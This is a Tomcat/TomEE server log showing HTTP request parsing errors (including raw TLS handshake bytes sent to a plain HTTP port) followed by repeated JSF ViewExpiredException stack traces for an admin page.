08-Aug-2024 00:13:23.577 INFO [http-nio-8080-exec-3] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
 Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
	java.lang.IllegalArgumentException: Invalid character found in method name [0x160x030x010x00{0x010x000x00w0x030x030xe90xc60x19p0x950xbcC0x94*0xff0xd10x19u0x9a0xcf0xcc0x97`0xec0x9b0xc50xae0xa6@0x8a0x020xd90xa80xe50xed0xbee0x000x000x1a0xc0/0xc0+0xc00x110xc00x070xc00x130xc00x090xc00x140xc00x0a0x000x050x00/0x0050xc00x120x000x0a0x010x000x0040x000x050x000x050x010x000x000x000x000x000x0a0x000x080x000x060x000x170x000x180x000x190x000x0b0x000x020x010x000x000x0d0x000x100x000x0e0x040x010x040x030x020x010x020x030x040x010x050x010x060x010xff0x010x000x01...]. HTTP method names must be tokens
		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:418)
		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:260)
		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:868)
		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1590)
		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
		at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)
		at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)
		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
		at java.base/java.lang.Thread.run(Thread.java:834)
08-Aug-2024 02:12:33.955 INFO [http-nio-8080-exec-6] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
 Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
	java.lang.IllegalArgumentException: Invalid character found in the HTTP protocol [1 -1]
		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:560)
		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:260)
		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:868)
		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1590)
		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
		at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)
		at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)
		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
		at java.base/java.lang.Thread.run(Thread.java:834)
08-Aug-2024 15:22:14.006 SEVERE [http-nio-8080-exec-4] com.sun.faces.context.AjaxExceptionHandlerImpl.handlePartialResponseError javax.faces.application.ViewExpiredException: viewId:/admin/index.xhtml - View /admin/index.xhtml could not be restored.
	at com.sun.faces.lifecycle.RestoreViewPhase.execute(RestoreViewPhase.java:218)
	at com.sun.faces.lifecycle.Phase.doPhase(Phase.java:100)
	at com.sun.faces.lifecycle.RestoreViewPhase.doPhase(RestoreViewPhase.java:133)
	at com.sun.faces.lifecycle.LifecycleImpl.execute(LifecycleImpl.java:201)
	at javax.faces.webapp.FacesServlet.service(FacesServlet.java:670)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.apache.openejb.server.httpd.EEFilter.doFilter(EEFilter.java:65)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.ocpsoft.rewrite.servlet.RewriteFilter.doFilter(RewriteFilter.java:226)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLessToExtension(FacesViewsForwardingFilter.java:180)
	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLess(FacesViewsForwardingFilter.java:137)
	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLess(FacesViewsForwardingFilter.java:123)
	at org.omnifaces.facesviews.FacesViewsForwardingFilter.doFilter(FacesViewsForwardingFilter.java:84)
	at org.omnifaces.filter.HttpFilter.doFilter(HttpFilter.java:108)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202)
	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96)
	at org.apache.tomee.catalina.OpenEJBValve.invoke(OpenEJBValve.java:45)
	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:541)
	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:139)
	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92)
	at org.apache.tomee.catalina.OpenEJBSecurityListener$RequestCapturer.invoke(OpenEJBSecurityListener.java:97)
	at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:690)
	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74)
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343)
	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:373)
	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:868)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1590)
	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
	at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)
	at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)
	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
	at java.base/java.lang.Thread.run(Thread.java:834)

08-Aug-2024 15:23:45.648 SEVERE [http-nio-8080-exec-1] com.sun.faces.context.AjaxExceptionHandlerImpl.handlePartialResponseError javax.faces.application.ViewExpiredException: viewId:/admin/index.xhtml - View /admin/index.xhtml could not be restored.
	at com.sun.faces.lifecycle.RestoreViewPhase.execute(RestoreViewPhase.java:218)
	at com.sun.faces.lifecycle.Phase.doPhase(Phase.java:100)
	at com.sun.faces.lifecycle.RestoreViewPhase.doPhase(RestoreViewPhase.java:133)
	at com.sun.faces.lifecycle.LifecycleImpl.execute(LifecycleImpl.java:201)
	at javax.faces.webapp.FacesServlet.service(FacesServlet.java:670)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.apache.openejb.server.httpd.EEFilter.doFilter(EEFilter.java:65)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.ocpsoft.rewrite.servlet.RewriteFilter.doFilter(RewriteFilter.java:226)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLessToExtension(FacesViewsForwardingFilter.java:180)
	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLess(FacesViewsForwardingFilter.java:137)
	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLess(FacesViewsForwardingFilter.java:123)
	at org.omnifaces.facesviews.FacesViewsForwardingFilter.doFilter(FacesViewsForwardingFilter.java:84)
	at org.omnifaces.filter.HttpFilter.doFilter(HttpFilter.java:108)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202)
	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96)
	at org.apache.tomee.catalina.OpenEJBValve.invoke(OpenEJBValve.java:45)
	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:541)
	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:139)
	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92)
	at org.apache.tomee.catalina.OpenEJBSecurityListener$RequestCapturer.invoke(OpenEJBSecurityListener.java:97)
	at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:690)
	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74)
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343)
	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:373)
	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:868)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1590)
	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
	at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)
	at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)
	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
	at java.base/java.lang.Thread.run(Thread.java:834)

08-Aug-2024 15:24:25.562 SEVERE [http-nio-8080-exec-3] com.sun.faces.context.AjaxExceptionHandlerImpl.handlePartialResponseError javax.faces.application.ViewExpiredException: viewId:/admin/index.xhtml - View /admin/index.xhtml could not be restored.
	at com.sun.faces.lifecycle.RestoreViewPhase.execute(RestoreViewPhase.java:218)
	at com.sun.faces.lifecycle.Phase.doPhase(Phase.java:100)
	at com.sun.faces.lifecycle.RestoreViewPhase.doPhase(RestoreViewPhase.java:133)
	at com.sun.faces.lifecycle.LifecycleImpl.execute(LifecycleImpl.java:201)
	at javax.faces.webapp.FacesServlet.service(FacesServlet.java:670)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.apache.openejb.server.httpd.EEFilter.doFilter(EEFilter.java:65)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.ocpsoft.rewrite.servlet.RewriteFilter.doFilter(RewriteFilter.java:226)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLessToExtension(FacesViewsForwardingFilter.java:180)
	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLess(FacesViewsForwardingFilter.java:137)
	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLess(FacesViewsForwardingFilter.java:123)
	at org.omnifaces.facesviews.FacesViewsForwardingFilter.doFilter(FacesViewsForwardingFilter.java:84)
	at org.omnifaces.filter.HttpFilter.doFilter(HttpFilter.java:108)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202)
	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96)
	at org.apache.tomee.catalina.OpenEJBValve.invoke(OpenEJBValve.java:45)
	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:541)
	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:139)
	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92)
	at org.apache.tomee.catalina.OpenEJBSecurityListener$RequestCapturer.invoke(OpenEJBSecurityListener.java:97)
	at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:690)
	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74)
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343)
	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:373)
	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:868)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1590)
	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
	at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)
	at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)
	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
	at java.base/java.lang.Thread.run(Thread.java:834)

08-Aug-2024 15:24:28.347 SEVERE [http-nio-8080-exec-2] com.sun.faces.context.AjaxExceptionHandlerImpl.handlePartialResponseError javax.faces.application.ViewExpiredException: viewId:/admin/index.xhtml - View /admin/index.xhtml could not be restored.
	at com.sun.faces.lifecycle.RestoreViewPhase.execute(RestoreViewPhase.java:218)
	at com.sun.faces.lifecycle.Phase.doPhase(Phase.java:100)
	at com.sun.faces.lifecycle.RestoreViewPhase.doPhase(RestoreViewPhase.java:133)
	at com.sun.faces.lifecycle.LifecycleImpl.execute(LifecycleImpl.java:201)
	at javax.faces.webapp.FacesServlet.service(FacesServlet.java:670)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.apache.openejb.server.httpd.EEFilter.doFilter(EEFilter.java:65)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.ocpsoft.rewrite.servlet.RewriteFilter.doFilter(RewriteFilter.java:226)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLessToExtension(FacesViewsForwardingFilter.java:180)
	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLess(FacesViewsForwardingFilter.java:137)
	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLess(FacesViewsForwardingFilter.java:123)
	at org.omnifaces.facesviews.FacesViewsForwardingFilter.doFilter(FacesViewsForwardingFilter.java:84)
	at org.omnifaces.filter.HttpFilter.doFilter(HttpFilter.java:108)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202)
	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96)
	at org.apache.tomee.catalina.OpenEJBValve.invoke(OpenEJBValve.java:45)
	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:541)
	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:139)
	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92)
	at org.apache.tomee.catalina.OpenEJBSecurityListener$RequestCapturer.invoke(OpenEJBSecurityListener.java:97)
	at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:690)
	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74)
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343)
	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:373)
	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:868)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1590)
	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
	at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)
	at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)
	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
	at java.base/java.lang.Thread.run(Thread.java:834)

08-Aug-2024 15:24:28.579 SEVERE [http-nio-8080-exec-8] com.sun.faces.context.AjaxExceptionHandlerImpl.handlePartialResponseError javax.faces.application.ViewExpiredException: viewId:/admin/index.xhtml - View /admin/index.xhtml could not be restored.
	at com.sun.faces.lifecycle.RestoreViewPhase.execute(RestoreViewPhase.java:218)
	at com.sun.faces.lifecycle.Phase.doPhase(Phase.java:100)
	at com.sun.faces.lifecycle.RestoreViewPhase.doPhase(RestoreViewPhase.java:133)
	at com.sun.faces.lifecycle.LifecycleImpl.execute(LifecycleImpl.java:201)
	at javax.faces.webapp.FacesServlet.service(FacesServlet.java:670)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.apache.openejb.server.httpd.EEFilter.doFilter(EEFilter.java:65)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.ocpsoft.rewrite.servlet.RewriteFilter.doFilter(RewriteFilter.java:226)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLessToExtension(FacesViewsForwardingFilter.java:180)
	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLess(FacesViewsForwardingFilter.java:137)
	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLess(FacesViewsForwardingFilter.java:123)
	at org.omnifaces.facesviews.FacesViewsForwardingFilter.doFilter(FacesViewsForwardingFilter.java:84)
	at org.omnifaces.filter.HttpFilter.doFilter(HttpFilter.java:108)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202)
	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96)
	at org.apache.tomee.catalina.OpenEJBValve.invoke(OpenEJBValve.java:45)
	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:541)
	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:139)
	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92)
	at org.apache.tomee.catalina.OpenEJBSecurityListener$RequestCapturer.invoke(OpenEJBSecurityListener.java:97)
	at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:690)
	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74)
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343)
	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:373)
	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:868)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1590)
	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
	at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)
	at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)
	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
	at java.base/java.lang.Thread.run(Thread.java:834)

08-Aug-2024 15:24:28.769 SEVERE [http-nio-8080-exec-5] com.sun.faces.context.AjaxExceptionHandlerImpl.handlePartialResponseError javax.faces.application.ViewExpiredException: viewId:/admin/index.xhtml - View /admin/index.xhtml could not be restored.
	at com.sun.faces.lifecycle.RestoreViewPhase.execute(RestoreViewPhase.java:218)
	at com.sun.faces.lifecycle.Phase.doPhase(Phase.java:100)
	at com.sun.faces.lifecycle.RestoreViewPhase.doPhase(RestoreViewPhase.java:133)
	at com.sun.faces.lifecycle.LifecycleImpl.execute(LifecycleImpl.java:201)
	at javax.faces.webapp.FacesServlet.service(FacesServlet.java:670)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.apache.openejb.server.httpd.EEFilter.doFilter(EEFilter.java:65)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.ocpsoft.rewrite.servlet.RewriteFilter.doFilter(RewriteFilter.java:226)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLessToExtension(FacesViewsForwardingFilter.java:180)
	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLess(FacesViewsForwardingFilter.java:137)
	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLess(FacesViewsForwardingFilter.java:123)
	at org.omnifaces.facesviews.FacesViewsForwardingFilter.doFilter(FacesViewsForwardingFilter.java:84)
	at org.omnifaces.filter.HttpFilter.doFilter(HttpFilter.java:108)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202)
	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96)
	at org.apache.tomee.catalina.OpenEJBValve.invoke(OpenEJBValve.java:45)
	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:541)
	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:139)
	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92)
	at org.apache.tomee.catalina.OpenEJBSecurityListener$RequestCapturer.invoke(OpenEJBSecurityListener.java:97)
	at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:690)
	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74)
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343)
	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:373)
	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:868)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1590)
	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
	at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)
	at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)
	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
	at java.base/java.lang.Thread.run(Thread.java:834)

08-Aug-2024 15:24:28.984 SEVERE [http-nio-8080-exec-4] com.sun.faces.context.AjaxExceptionHandlerImpl.handlePartialResponseError javax.faces.application.ViewExpiredException: viewId:/admin/index.xhtml - View /admin/index.xhtml could not be restored.
	at com.sun.faces.lifecycle.RestoreViewPhase.execute(RestoreViewPhase.java:218)
	at com.sun.faces.lifecycle.Phase.doPhase(Phase.java:100)
	at com.sun.faces.lifecycle.RestoreViewPhase.doPhase(RestoreViewPhase.java:133)
	at com.sun.faces.lifecycle.LifecycleImpl.execute(LifecycleImpl.java:201)
	at javax.faces.webapp.FacesServlet.service(FacesServlet.java:670)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.apache.openejb.server.httpd.EEFilter.doFilter(EEFilter.java:65)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.ocpsoft.rewrite.servlet.RewriteFilter.doFilter(RewriteFilter.java:226)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLessToExtension(FacesViewsForwardingFilter.java:180)
	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLess(FacesViewsForwardingFilter.java:137)
	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLess(FacesViewsForwardingFilter.java:123)
	at org.omnifaces.facesviews.FacesViewsForwardingFilter.doFilter(FacesViewsForwardingFilter.java:84)
	at org.omnifaces.filter.HttpFilter.doFilter(HttpFilter.java:108)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202)
	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96)
	at org.apache.tomee.catalina.OpenEJBValve.invoke(OpenEJBValve.java:45)
	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:541)
	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:139)
	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92)
	at org.apache.tomee.catalina.OpenEJBSecurityListener$RequestCapturer.invoke(OpenEJBSecurityListener.java:97)
	at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:690)
	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74)
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343)
